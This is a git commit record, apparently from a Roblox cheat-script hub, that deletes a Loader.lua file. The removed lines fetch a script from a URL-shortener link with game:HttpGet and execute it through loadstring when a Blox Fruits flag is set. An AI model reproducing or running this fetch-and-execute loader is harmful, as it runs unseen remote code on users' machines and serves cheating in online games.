ead0cd18f6f70d6b93e5e549a611fcfc5ce655e4
Dr.Txz <kiritovold334@gmail.com>
2025-06-16 23:05:50 +0200

    Delete Loader.lua

--- Loader.lua
+++
@@ -1,5 +0,0 @@
-if getgenv().BloxFruits == true then
-    loadstring(game:HttpGet("https://shorturl.at/oM1od"))()
-else
-    game:GetService("Players").LocalPlayer:Kick("Eternal X Hub : Not Support this game")
-end
